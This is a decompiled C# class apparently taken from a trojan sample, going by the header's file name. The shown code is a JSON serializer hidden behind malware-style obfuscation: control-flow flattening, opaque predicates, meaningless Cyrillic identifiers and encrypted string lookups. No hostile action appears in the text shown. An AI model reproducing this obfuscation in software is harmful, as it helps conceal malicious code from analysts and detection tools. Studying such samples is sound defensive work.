// Decompiled with JetBrains decompiler
// Type: @Ӟ
// Assembly: uLqhNaw2rJQahaaHEibmS0F8CAhQ12f0pD0UHJWVCL, Version=9.1.2.0, Culture=neutral, PublicKeyToken=null
// MVID: D212B58E-19EB-4690-837D-62FC76EFC9D2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-c92d5d3e7959656b93039f2d0479f1cd50ca98907ea5aa0a925724b1dca475a3.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.Globalization;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization;
using System.Text;

internal static class \u0040Ӟ
{
  [MethodImpl(MethodImplOptions.NoInlining)]
  public static string \u0040ӓ(this object _param0)
  {
    int num;
    if (\u0040Ӟ.\u0040Ӗ())
    {
      if (true)
      {
        num = 3;
        goto label_3;
      }
    }
    else
      goto label_7;
label_2:
    StringBuilder stringBuilder;
    \u0040Ӟ.\u0040ӕ((object) stringBuilder, _param0);
    goto label_5;
label_3:
    while (true)
    {
      switch (num)
      {
        case 0:
        case 3:
          goto label_6;
        case 1:
        case 4:
          goto label_2;
        case 2:
          goto label_5;
        case 5:
          goto label_8;
        default:
          num = 2;
          continue;
      }
    }
label_6:
    stringBuilder = new StringBuilder();
    goto label_2;
label_5:
    string str = stringBuilder.ToString();
    num = 5;
    goto label_3;
label_7:
    num = 4;
    if (\u0040Ӟ.\u0040Ӗ())
      goto label_3;
label_8:
    return str;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static void \u0040Ӕ(object _param0, object _param1)
  {
    int num1 = 17;
    while (true)
    {
      Type type;
      int num2;
      bool flag1;
      bool flag2;
      PropertyInfo[] properties;
      bool flag3;
      bool flag4;
      bool flag5;
      IList list;
      bool flag6;
      bool flag7;
      bool flag8;
      object obj1;
      bool flag9;
      FieldInfo[] fields;
      bool flag10;
      bool flag11;
      string str;
      int num3;
      int index1;
      bool flag12;
      int num4;
      IDictionary dictionary;
      bool isEnum;
      int index2;
      object obj2;
      bool flag13;
      bool flag14;
      Type genericArgument;
      bool flag15;
      bool flag16;
      bool flag17;
      IEnumerator enumerator;
      bool flag18;
      bool flag19;
      bool flag20;
      bool flag21;
      int num5;
      int num6;
      int num7;
      int num8;
      int num9;
      int num10;
      int num11;
      int num12;
      switch (num1)
      {
        case 0:
          flag21 = flag2;
          num1 = 12;
          continue;
        case 1:
          ++num4;
          num1 = 48;
          continue;
        case 2:
          enumerator = (IEnumerator) \u0040Ӟ.\u0040ӧ(\u0040Ӟ.\u0040Ӧ((object) dictionary));
          if (true)
          {
            num1 = 59;
            continue;
          }
          goto case 44;
        case 3:
          \u0040Ӟ.\u0040Ӝ(_param0, ']');
          num1 = 101;
          continue;
        case 4:
          flag17 = false;
          if (\u0040Ӟ.\u0040Ӗ())
          {
            num1 = 115;
            continue;
          }
          goto case 38;
        case 5:
          // ISSUE: type reference
          num5 = \u0040Ӟ.\u0040ӛ(type, \u0040Ӟ.\u0040Ӛ(__typeref (ushort))) ? 1 : 0;
          goto label_43;
        case 6:
          \u0040Ӟ.\u0040ә(_param0, (object) \u0040ԝ.\u0040լ((MemberInfo) fields[index2]));
          num1 = 52;
          continue;
        case 7:
          \u0040Ӟ.\u0040Ӝ(_param0, \u0040Ӟ.\u0040ӟ(\u0040Ӟ.\u0040Ә(662), num2));
          num1 = 51;
          continue;
        case 8:
          list = _param1 as IList;
          if (true)
          {
            num1 = 11;
            continue;
          }
          goto label_20;
        case 9:
          flag16 = true;
          if (\u0040Ӟ.\u0040Ӗ())
          {
            num1 = 2;
            continue;
          }
          goto case 4;
        case 10:
        case 14:
          if (\u0040Ӟ.\u0040ӝ((object) str, num3) != '"')
          {
            num1 = 89;
            continue;
          }
          goto label_141;
        case 11:
          num4 = 0;
          num1 = 113;
          continue;
        case 12:
          if (flag21)
          {
            num1 = 18;
            continue;
          }
          \u0040Ӟ.\u0040Ӝ(_param0, ',');
          if (\u0040Ӟ.\u0040Ӗ())
          {
            num1 = 92;
            continue;
          }
          goto case 19;
        case 13:
          goto label_187;
        case 15:
        case 51:
        case 87:
          ++num3;
          num1 = 53;
          continue;
        case 16:
          // ISSUE: type reference
          num6 = \u0040Ӟ.\u0040ӛ(type, \u0040Ӟ.\u0040Ӛ(__typeref (uint))) ? 1 : 0;
          break;
        case 17:
          flag20 = _param1 == null;
          if (true)
          {
            num1 = 95;
            continue;
          }
          goto case 79;
        case 18:
          flag2 = false;
          num1 = 39;
          continue;
        case 19:
          \u0040Ӟ.\u0040ә(_param0, (object) \u0040ԝ.\u0040լ((MemberInfo) properties[index1]));
          if (\u0040Ӟ.\u0040Ӗ())
          {
            num1 = 103;
            continue;
          }
          goto case 48;
        case 20:
          str = _param1.ToString();
          if (true)
          {
            num1 = 56;
            continue;
          }
          goto case 114;
        case 21:
          goto label_176;
        case 22:
          goto label_173;
        case 23:
          \u0040Ӟ.\u0040ә(_param0, (object) ((float) _param1).ToString((IFormatProvider) \u0040Ӟ.\u0040Ӣ()));
          num1 = 70;
          continue;
        case 24:
          if (!flag18)
          {
            \u0040Ӟ.\u0040Ӝ(_param0, ',');
            num1 = 114;
            continue;
          }
          num1 = 4;
          continue;
        case 25:
          flag1 = num2 >= 0;
          num1 = 96;
          continue;
        case 26:
          \u0040Ӟ.\u0040ә(_param0, (object) _param1.ToString());
          if (\u0040Ӟ.\u0040Ӗ())
          {
            num1 = 46;
            continue;
          }
          goto case 50;
        case 27:
          goto label_168;
        case 28:
          flag14 = obj2 != null;
          num1 = 90;
          continue;
        case 29:
          if (!flag7)
          {
            num1 = 3;
            continue;
          }
          flag18 = flag17;
          goto case 24;
        case 30:
          \u0040Ӟ.\u0040ә(_param0, \u0040Ӟ.\u0040Ә(724));
          if (!\u0040Ӟ.\u0040ӗ())
          {
            num1 = 110;
            continue;
          }
          goto case 91;
        case 31:
          index2 = 0;
          num1 = 102;
          continue;
        case 32:
          goto case 42;
        case 33:
          \u0040Ӟ.\u0040Ӝ(_param0, '[');
          if (!\u0040Ӟ.\u0040ӗ())
          {
            num1 = 99;
            continue;
          }
          goto case 69;
        case 34:
          \u0040Ӟ.\u0040ӕ(_param0, obj2);
          int num13 = 32;
          num1 = \u0040Ӟ.\u0040ӗ() ? num13 : num13;
          continue;
        case 35:
          if (flag5)
          {
            num1 = 81;
            continue;
          }
          // ISSUE: type reference
          flag13 = \u0040Ӟ.\u0040ӛ(type, \u0040Ӟ.\u0040Ӛ(__typeref (Decimal)));
          if (true)
          {
            num1 = 100;
            continue;
          }
          goto case 55;
        case 36:
          \u0040Ӟ.\u0040Ӝ(_param0, '}');
          num1 = 119;
          continue;
        case 37:
          // ISSUE: type reference
          num9 = \u0040Ӟ.\u0040ӛ(type, \u0040Ӟ.\u0040Ӛ(__typeref (sbyte))) ? 1 : 0;
          goto label_95;
        case 38:
        case 102:
          flag3 = index2 < fields.Length;
          num1 = 91;
          continue;
        case 39:
        case 92:
          \u0040Ӟ.\u0040Ӝ(_param0, '"');
          num1 = 19;
          continue;
        case 40:
label_166:
          ++index1;
          if (\u0040Ӟ.\u0040Ӗ())
          {
            num1 = 93;
            continue;
          }
          goto case 68;
        case 41:
          flag2 = true;
          int num14 = 117;
          num1 = \u0040Ӟ.\u0040ӗ() ? num14 : num14;
          continue;
        case 42:
          ++index2;
          num1 = 38;
          continue;
        case 43:
          \u0040Ӟ.\u0040ә(_param0, (object) _param1.ToString());
          num1 = 105;
          continue;
        case 44:
        case 78:
          \u0040Ӟ.\u0040Ӝ(_param0, '"');
          num1 = 6;
          continue;
        case 45:
        case 53:
          flag15 = num3 < \u0040Ӟ.\u0040ӡ((object) str);
          num1 = 71;
          continue;
        case 46:
          \u0040Ӟ.\u0040Ӝ(_param0, '"');
          num1 = 73;
          continue;
        case 47:
          \u0040Ӟ.\u0040ӕ(_param0, obj1);
          int num15 = 104;
          num1 = \u0040Ӟ.\u0040ӗ() ? num15 : num15;
          continue;
        case 48:
        case 113:
          flag7 = num4 < \u0040Ӟ.\u0040Ӥ((object) list);
          num1 = 29;
          continue;
        case 49:
          \u0040Ӟ.\u0040Ӝ(_param0, '\\');
          if (true)
          {
            num1 = 72;
            continue;
          }
          goto case 84;
        case 50:
          genericArgument = type.GetGenericArguments()[0];
          num1 = 55;
          continue;
        case 52:
          \u0040Ӟ.\u0040ә(_param0, \u0040Ӟ.\u0040Ә(732));
          num1 = 34;
          continue;
        case 54:
          if (flag12)
          {
            num1 = 112;
            continue;
          }
          isEnum = type.IsEnum;
          if (\u0040Ӟ.\u0040Ӗ())
          {
            num1 = 62;
            continue;
          }
          goto case 42;
        case 55:
          // ISSUE: type reference
          flag8 = \u0040Ӟ.\u0040ӥ(genericArgument, \u0040Ӟ.\u0040Ӛ(__typeref (string)));
          if (true)
          {
            num1 = 65;
            continue;
          }
          goto case 36;
        case 56:
          num3 = 0;
          num1 = 45;
          continue;
        case 57:
          \u0040Ӟ.\u0040ә(_param0, (object) ((Decimal) _param1).ToString((IFormatProvider) \u0040Ӟ.\u0040Ӣ()));
          num1 = 21;
          continue;
        case 58:
          properties = type.GetProperties(BindingFlags.Instance | BindingFlags.Public | BindingFlags.FlattenHierarchy);
          num1 = 97;
          continue;
        case 59:
          try
          {
label_186:
            while (\u0040Ӟ.\u0040Ӫ((object) enumerator))
            {
              object obj3 = \u0040Ӟ.\u0040Ө((object) enumerator);
              int num16 = 7;
              while (true)
              {
                bool flag22;
                switch (num16)
                {
                  case 0:
                    flag16 = false;
                    if (\u0040Ӟ.\u0040ӗ())
                    {
                      if (true)
                      {
                        num16 = 5;
                        continue;
                      }
                      goto case 1;
                    }
                    else
                    {
                      if (!\u0040Ӟ.\u0040ӗ())
                      {
                        num16 = 2;
                        continue;
                      }
                      goto case 9;
                    }
                  case 1:
                    \u0040Ӟ.\u0040ә(_param0, \u0040Ӟ.\u0040Ә(732));
                    if (true)
                    {
                      num16 = 8;
                      continue;
                    }
                    break;
                  case 6:
                    \u0040Ӟ.\u0040ә(_param0, (object) (string) obj3);
                    num16 = 1;
                    continue;
                  case 7:
                    flag22 = flag16;
                    num16 = 9;
                    continue;
                  case 8:
                    \u0040Ӟ.\u0040ӕ(_param0, \u0040Ӟ.\u0040ө((object) dictionary, obj3));
                    num16 = 10;
                    continue;
                  case 9:
                    if (!flag22)
                    {
                      \u0040Ӟ.\u0040Ӝ(_param0, ',');
                      break;
                    }
                    if (\u0040Ӟ.\u0040Ӗ())
                    {
                      num16 = 0;
                      continue;
                    }
                    goto case 8;
                  case 10:
                    goto label_186;
                }
                \u0040Ӟ.\u0040Ӝ(_param0, '"');
                num16 = 6;
              }
            }
          }
          finally
          {
            if (enumerator is IDisposable disposable)
              \u0040Ӟ.\u0040ӫ((object) disposable);
          }
          \u0040Ӟ.\u0040Ӝ(_param0, '}');
          num1 = 116;
          continue;
        case 60:
          // ISSUE: type reference
          num11 = \u0040Ӟ.\u0040ӛ(type, \u0040Ӟ.\u0040Ӛ(__typeref (char))) ? 1 : 0;
          goto label_138;
        case 61:
          \u0040Ӟ.\u0040Ӝ(_param0, '"');
          num1 = 26;
          continue;
        case 62:
          if (isEnum)
          {
            num1 = 61;
            continue;
          }
          flag11 = _param1 is IList;
          num1 = 75;
          continue;
        case 63:
          \u0040Ӟ.\u0040Ӝ(_param0, '"');
          if (!\u0040Ӟ.\u0040ӗ())
          {
            num1 = 85;
            continue;
          }
          goto case 75;
        case 64:
          \u0040Ӟ.\u0040ә(_param0, (object) _param1.ToString());
          if (true)
          {
            num1 = 22;
            continue;
          }
          goto label_113;
        case 65:
          if (flag8)
          {
            num1 = 30;
            continue;
          }
          \u0040Ӟ.\u0040Ӝ(_param0, '{');
          num1 = 80;
          continue;
        case 66:
          flag9 = obj1 != null;
          num1 = 83;
          continue;
        case 67:
          \u0040Ӟ.\u0040ә(_param0, \u0040Ӟ.\u0040Ә(632));
          if (true)
          {
            num1 = 98;
            continue;
          }
          goto case 15;
        case 68:
          \u0040Ӟ.\u0040Ӝ(_param0, '"');
          num1 = 20;
          continue;
        case 69:
        case 88:
          if (!flag6)
          {
            \u0040Ӟ.\u0040Ӝ(_param0, ',');
            if (true)
            {
              num1 = 44;
              continue;
            }
            goto case 107;
          }
          else
          {
            num1 = 79;
            continue;
          }
        case 70:
          goto label_160;
        case 71:
          if (flag15)
          {
            if (\u0040Ӟ.\u0040ӝ((object) str, num3) >= ' ')
            {
              if (!\u0040Ӟ.\u0040Ӗ())
              {
                int num17 = 69;
                num1 = \u0040Ӟ.\u0040ӗ() ? num17 : num17;
                continue;
              }
              if (!\u0040Ӟ.\u0040ӗ())
              {
                num1 = 14;
                continue;
              }
              goto case 60;
            }
            else
              goto label_141;
          }
          else
          {
            if (true)
            {
              num1 = 63;
              continue;
            }
            goto case 95;
          }
        case 72:
          num2 = \u0040Ӟ.\u0040Ӟ(\u0040Ӟ.\u0040Ә(644), \u0040Ӟ.\u0040ӝ((object) str, num3));
          num1 = 25;
          continue;
        case 73:
          goto label_156;
        case 74:
          \u0040Ӟ.\u0040ә(_param0, (object) _param1.ToString());
          num1 = 77;
          continue;
        case 75:
          if (flag11)
          {
            num1 = 33;
            continue;
          }
          if (!type.IsGenericType)
          {
            num12 = 0;
            goto label_109;
          }
          else
          {
            num1 = 111;
            continue;
          }
        case 76:
          // ISSUE: type reference
          num10 = \u0040Ӟ.\u0040Ӭ((object) properties[index1], \u0040Ӟ.\u0040Ӛ(__typeref (IgnoreDataMemberAttribute)), true) ? 1 : 0;
          goto label_83;
        case 77:
          goto label_155;
        case 79:
          flag2 = false;
          if (\u0040Ӟ.\u0040Ӗ())
          {
            num1 = 78;
            continue;
          }
          goto case 97;
        case 80:
          dictionary = _param1 as IDictionary;
          num1 = 9;
          continue;
        case 81:
          \u0040Ӟ.\u0040ә(_param0, (object) ((double) _param1).ToString((IFormatProvider) \u0040Ӟ.\u0040Ӣ()));
          if (true)
          {
            num1 = 118;
            continue;
          }
          goto case 83;
        case 82:
          // ISSUE: type reference
          if (\u0040Ӟ.\u0040ӛ(type, \u0040Ӟ.\u0040Ӛ(__typeref (string))))
          {
            num11 = 1;
            goto label_138;
          }
          else
          {
            num1 = 60;
            continue;
          }
        case 83:
          if (flag9)
          {
            num1 = 0;
            continue;
          }
          goto label_165;
        case 84:
          if (!flag4)
          {
            if (!\u0040Ӟ.\u0040ӗ())
            {
              num1 = 36;
              continue;
            }
            goto case 35;
          }
          else if (!\u0040Ӟ.\u0040Ӯ((object) properties[index1]))
          {
            num10 = 1;
            goto label_83;
          }
          else
          {
            num1 = 76;
            continue;
          }
        case 85:
          goto label_150;
        case 86:
        case 93:
          flag4 = index1 < properties.Length;
          num1 = 84;
          continue;
        case 89:
label_140:
          num8 = \u0040Ӟ.\u0040ӝ((object) str, num3) == '\\' ? 1 : 0;
          goto label_142;
        case 90:
          if (flag14)
          {
            num1 = 107;
            continue;
          }
          goto case 32;
        case 91:
          if (!flag3)
          {
            num1 = 58;
            continue;
          }
          // ISSUE: type reference
          flag19 = \u0040Ӟ.\u0040Ӭ((object) fields[index2], \u0040Ӟ.\u0040Ӛ(__typeref (IgnoreDataMemberAttribute)), true);
          if (\u0040Ӟ.\u0040Ӗ())
          {
            num1 = 108;
            continue;
          }
          goto case 59;
        case 94:
label_46:
          // ISSUE: type reference
          num7 = \u0040Ӟ.\u0040ӛ(type, \u0040Ӟ.\u0040Ӛ(__typeref (ulong))) ? 1 : 0;
          goto label_48;
        case 95:
          if (!flag20)
          {
            type = _param1.GetType();
            if (!\u0040Ӟ.\u0040ӗ())
            {
              num1 = 82;
              continue;
            }
            goto case 10;
          }
          else
          {
            num1 = 67;
            continue;
          }
        case 96:
          if (flag1)
          {
            num1 = 7;
            continue;
          }
          \u0040Ӟ.\u0040Ӡ(_param0, \u0040Ӟ.\u0040Ә(680), (object) (uint) \u0040Ӟ.\u0040ӝ((object) str, num3));
          if (true)
          {
            num1 = 15;
            continue;
          }
          goto case 108;
        case 97:
          index1 = 0;
          if (true)
          {
            num1 = 86;
            continue;
          }
          goto case 109;
        case 98:
          goto label_130;
        case 99:
          flag17 = true;
          if (true)
          {
            num1 = 8;
            continue;
          }
          goto case 104;
        case 100:
          if (!flag13)
          {
            // ISSUE: type reference
            flag12 = \u0040Ӟ.\u0040ӛ(type, \u0040Ӟ.\u0040Ӛ(__typeref (bool)));
            num1 = 54;
            continue;
          }
          num1 = 57;
          continue;
        case 101:
          goto label_126;
        case 103:
          \u0040Ӟ.\u0040ә(_param0, \u0040Ӟ.\u0040Ә(732));
          num1 = 47;
          continue;
        case 104:
          goto label_165;
        case 105:
          goto label_119;
        case 106:
          \u0040Ӟ.\u0040ә(_param0, (object) _param1.ToString());
          num1 = 27;
          continue;
        case 107:
          flag6 = flag2;
          goto case 69;
        case 108:
          if (!flag19)
          {
            obj2 = \u0040Ӟ.\u0040ӭ((object) fields[index2], _param1);
            num1 = 28;
            continue;
          }
          num1 = 42;
          continue;
        case 109:
          if (!flag10)
          {
            // ISSUE: type reference
            flag5 = \u0040Ӟ.\u0040ӛ(type, \u0040Ӟ.\u0040Ӛ(__typeref (double)));
            num1 = 35;
            continue;
          }
          num1 = 23;
          continue;
        case 110:
          goto label_114;
        case 111:
          // ISSUE: type reference
          num12 = \u0040Ӟ.\u0040ӛ(type.GetGenericTypeDefinition(), \u0040Ӟ.\u0040Ӛ(__typeref (Dictionary<,>))) ? 1 : 0;
          goto label_109;
        case 112:
          \u0040Ӟ.\u0040ә(_param0, (bool) _param1 ? \u0040Ӟ.\u0040Ә(712) : \u0040Ӟ.\u0040Ә(698));
          num1 = 13;
          continue;
        case 114:
        case 115:
          \u0040Ӟ.\u0040ӕ(_param0, \u0040Ӟ.\u0040ӣ((object) list, num4));
          num1 = 1;
          continue;
        case 116:
          goto label_102;
        case 117:
          fields = type.GetFields(BindingFlags.Instance | BindingFlags.Public | BindingFlags.FlattenHierarchy);
          num1 = 31;
          continue;
        case 118:
          goto label_101;
        case 119:
          goto label_216;
        default:
          num1 = 24;
          continue;
      }
label_3:
      if (num6 != 0)
      {
        num1 = 106;
        continue;
      }
      // ISSUE: type reference
      if (\u0040Ӟ.\u0040ӛ(type, \u0040Ӟ.\u0040Ӛ(__typeref (long))))
      {
        num7 = 1;
        goto label_48;
      }
      else
      {
        num1 = 94;
        continue;
      }
label_43:
      if (num5 != 0)
      {
        num1 = 74;
        continue;
      }
      // ISSUE: type reference
      if (\u0040Ӟ.\u0040ӛ(type, \u0040Ӟ.\u0040Ӛ(__typeref (int))))
      {
        num6 = 1;
        goto label_3;
      }
      else
      {
        num1 = 16;
        continue;
      }
label_48:
      if (num7 == 0)
      {
        // ISSUE: type reference
        flag10 = \u0040Ӟ.\u0040ӛ(type, \u0040Ӟ.\u0040Ӛ(__typeref (float)));
        num1 = 109;
        continue;
      }
      num1 = 64;
      continue;
label_83:
      if (num10 == 0)
      {
        obj1 = \u0040Ӟ.\u0040ӯ((object) properties[index1], _param1, (object) null);
        if (!\u0040Ӟ.\u0040ӗ())
        {
          num1 = 66;
          continue;
        }
        goto label_46;
      }
      else
      {
        num1 = 40;
        continue;
      }
label_95:
      if (num9 != 0)
      {
        num1 = 43;
        continue;
      }
      // ISSUE: type reference
      if (\u0040Ӟ.\u0040ӛ(type, \u0040Ӟ.\u0040Ӛ(__typeref (short))))
      {
        num5 = 1;
        goto label_43;
      }
      else
      {
        if (\u0040Ӟ.\u0040Ӗ())
        {
          num1 = 5;
          continue;
        }
        goto label_129;
      }
label_109:
      if (num12 == 0)
      {
        \u0040Ӟ.\u0040Ӝ(_param0, '{');
        int num18 = 41;
        num1 = \u0040Ӟ.\u0040ӗ() ? num18 : num18;
        continue;
      }
      num1 = 50;
      continue;
label_138:
      if (num11 == 0)
      {
        // ISSUE: type reference
        if (!\u0040Ӟ.\u0040ӛ(type, \u0040Ӟ.\u0040Ӛ(__typeref (byte))))
        {
          num1 = 37;
          continue;
        }
        num9 = 1;
        goto label_95;
      }
      else
      {
        if (true)
        {
          num1 = 68;
          continue;
        }
        goto label_140;
      }
label_141:
      num8 = 1;
label_142:
      if (num8 == 0)
      {
        \u0040Ӟ.\u0040Ӝ(_param0, \u0040Ӟ.\u0040ӝ((object) str, num3));
        num1 = 87;
        continue;
      }
      num1 = 49;
      continue;
label_165:
      goto label_166;
    }
label_20:
    return;
label_187:
    return;
label_101:
    return;
label_102:
    return;
label_114:
    return;
label_119:
    return;
label_126:
    return;
label_130:
    return;
label_155:
    return;
label_156:
    return;
label_160:
    return;
label_168:
    return;
label_173:
    return;
label_176:
    return;
label_150:
    return;
label_113:
    return;
label_129:
    return;
label_216:;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӕ(object _param0, object _param1) => \u0040Ӟ.\u0040Ӕ(_param0, _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӗ() => true;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӗ() => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ә(int _param0) => (object) \u0040շ.\u0040ӻ(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ә(object _param0, object _param1) => (object) ((StringBuilder) _param0).Append((string) _param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static Type \u0040Ӛ(RuntimeTypeHandle _param0) => Type.GetTypeFromHandle(_param0);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӛ(Type _param0, Type _param1) => _param0 == _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӝ(object _param0, char _param1) => (object) ((StringBuilder) _param0).Append(_param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static char \u0040ӝ(object _param0, int _param1) => ((string) _param0)[_param1];

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int \u0040Ӟ(object _param0, char _param1) => ((string) _param0).IndexOf(_param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static char \u0040ӟ(object _param0, int _param1) => ((string) _param0)[_param1];

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӡ(object _param0, object _param1, object _param2) => (object) ((StringBuilder) _param0).AppendFormat((string) _param1, _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int \u0040ӡ(object _param0) => ((string) _param0).Length;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӣ() => (object) CultureInfo.InvariantCulture;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӣ(object _param0, int _param1) => ((IList) _param0)[_param1];

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static int \u0040Ӥ(object _param0) => ((ICollection) _param0).Count;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040ӥ(Type _param0, Type _param1) => _param0 != _param1;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ӧ(object _param0) => (object) ((IDictionary) _param0).Keys;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӧ(object _param0) => (object) ((IEnumerable) _param0).GetEnumerator();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040Ө(object _param0) => ((IEnumerator) _param0).Current;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ө(object _param0, object _param1) => ((IDictionary) _param0)[_param1];

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӫ(object _param0) => ((IEnumerator) _param0).MoveNext();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static void \u0040ӫ(object _param0) => ((IDisposable) _param0).Dispose();

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӭ(object _param0, Type _param1, bool _param2) => ((MemberInfo) _param0).IsDefined(_param1, _param2);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӭ(object _param0, object _param1) => ((FieldInfo) _param0).GetValue(_param1);

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static bool \u0040Ӯ(object _param0) => ((PropertyInfo) _param0).CanRead;

  [MethodImpl(MethodImplOptions.NoInlining)]
  internal static object \u0040ӯ(object _param0, object _param1, object _param2) => ((PropertyInfo) _param0).GetValue(_param1, (object[]) _param2);
}
